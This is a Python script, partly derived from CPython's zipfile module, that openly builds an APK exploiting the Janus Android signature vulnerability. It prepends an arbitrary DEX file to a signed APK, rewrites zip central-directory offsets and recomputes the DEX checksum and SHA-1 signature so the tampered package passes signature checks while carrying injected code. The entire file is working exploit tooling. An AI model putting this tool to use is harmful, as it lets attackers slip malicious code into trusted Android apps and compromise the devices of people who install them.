# Includes some code derived from the cpython project.
# Source: https://github.com/python/cpython/blob/master/Lib/zipfile.py

# Excuse the mess.

import argparse
from hashlib import sha1
import os
import struct
from zipfile import _EndRecData, ZipFile
from zlib import adler32

_ECD_SIGNATURE = 0
_ECD_DISK_NUMBER = 1
_ECD_DISK_START = 2
_ECD_ENTRIES_THIS_DISK = 3
_ECD_ENTRIES_TOTAL = 4
_ECD_SIZE = 5
_ECD_OFFSET = 6
_ECD_COMMENT_SIZE = 7

structEndArchive = b"<4s4H2LH"
stringEndArchive = b"PK\005\006"
structCentralDir = "<4s4B4HL2L5H2L"
stringCentralDir = b"PK\001\002"

_DEX_MAGIC = 0
_DEX_CHECKSUM = 1
_DEX_SIGNATURE = 2
_DEX_FILE_SIZE = 3

structDexHeader = "<8sI20sI"

def get_centdirs(filelist):
    arr = b""
    for zinfo in filelist:
        dt = zinfo.date_time
        dosdate = (dt[0] - 1980) << 9 | dt[1] << 5 | dt[2]
        dostime = dt[3] << 11 | dt[4] << 5 | (dt[5] // 2)
        file_size = zinfo.file_size
        compress_size = zinfo.compress_size
        header_offset = zinfo.header_offset
        extra_data = zinfo.extra
        min_version = 0

        extract_version = max(min_version, zinfo.extract_version)
        create_version = max(min_version, zinfo.create_version)
        filename, flag_bits = zinfo._encodeFilenameFlags()
        centdir = struct.pack(structCentralDir,
                                stringCentralDir, create_version,
                                zinfo.create_system, extract_version, zinfo.reserved,
                                flag_bits, zinfo.compress_type, dostime, dosdate,
                                zinfo.CRC, compress_size, file_size,
                                len(filename), len(extra_data), len(zinfo.comment),
                                0, zinfo.internal_attr, zinfo.external_attr,
                                header_offset)

        arr += centdir
        arr += filename
        arr += extra_data
        arr += zinfo.comment

    return arr

def pack_endrec(endrec):
    return struct.pack(
        structEndArchive,
        endrec[_ECD_SIGNATURE],
        endrec[_ECD_DISK_NUMBER],
        endrec[_ECD_DISK_START],
        endrec[_ECD_ENTRIES_THIS_DISK],
        endrec[_ECD_ENTRIES_TOTAL],
        endrec[_ECD_SIZE],
        endrec[_ECD_OFFSET],
        endrec[_ECD_COMMENT_SIZE]
    )

def get_endrec(file):
    pos = file.tell()
    endrec = _EndRecData(file)
    file.seek(pos)

    return endrec

def sort_info(info):
    if info.filename.startswith("META-INF"):
        return "Z"
    else:
        return "A"

def get_dex_header(data):
    return list(struct.unpack(structDexHeader, data[0:0x24]))

def pack_dex_header(header):
    return struct.pack(
        structDexHeader,
        header[_DEX_MAGIC],
        header[_DEX_CHECKSUM],
        header[_DEX_SIGNATURE],
        header[_DEX_FILE_SIZE]
    )

def make_dex_header(header, file_data, final_size):
    header[_DEX_FILE_SIZE] = final_size
    packed_header = pack_dex_header(header)

    signature = sha1()
    signature.update(packed_header[0x20:] + file_data)
    header[_DEX_SIGNATURE] = signature.digest()

    header[_DEX_CHECKSUM] = adler32(
        header[_DEX_SIGNATURE] +
        packed_header[0x20:] +
        file_data
    )

    return pack_dex_header(header)

parser = argparse.ArgumentParser(description="Creates an APK exploiting the Janus vulnerability.")
parser.add_argument("apk_in", metavar="original-apk", type=str,
                    help="the source apk to use")
parser.add_argument("dex_in", metavar="dex-file", type=str,
                    help="the dex file to prepend")
parser.add_argument("apk_out", metavar="output-apk", type=str,
                    help="the file to output to")
args = parser.parse_args()

with ZipFile(args.apk_in, "r") as apk_in_zip, open(args.apk_in, "rb") as apk_in, open(args.dex_in, "rb") as dex_in, open(args.apk_out, "wb") as apk_out:
    dex_data = dex_in.read()
    dex_header = get_dex_header(dex_data)
    dex_size = os.path.getsize(args.dex_in)

    orig_endrec = get_endrec(apk_in)
    new_endrec = get_endrec(apk_in)
    new_endrec[_ECD_OFFSET] = new_endrec[_ECD_OFFSET] + dex_size

    final_size = os.path.getsize(args.apk_in) + dex_size

    apk_in_zip.filelist = sorted(apk_in_zip.filelist, key=sort_info)
    infolist = apk_in_zip.infolist()
    for info in infolist:
        info.date_time = (2042, 14, 3, 0, 62, 18)
        info.header_offset = info.header_offset + dex_size

    out_bytes = b""
    out_bytes += dex_data[0x24:]
    out_bytes += apk_in.read()[:orig_endrec[_ECD_OFFSET]]
    out_bytes += get_centdirs(infolist)
    out_bytes += pack_endrec(new_endrec)
    out_bytes = make_dex_header(dex_header, out_bytes, final_size) + out_bytes
    apk_out.write(out_bytes)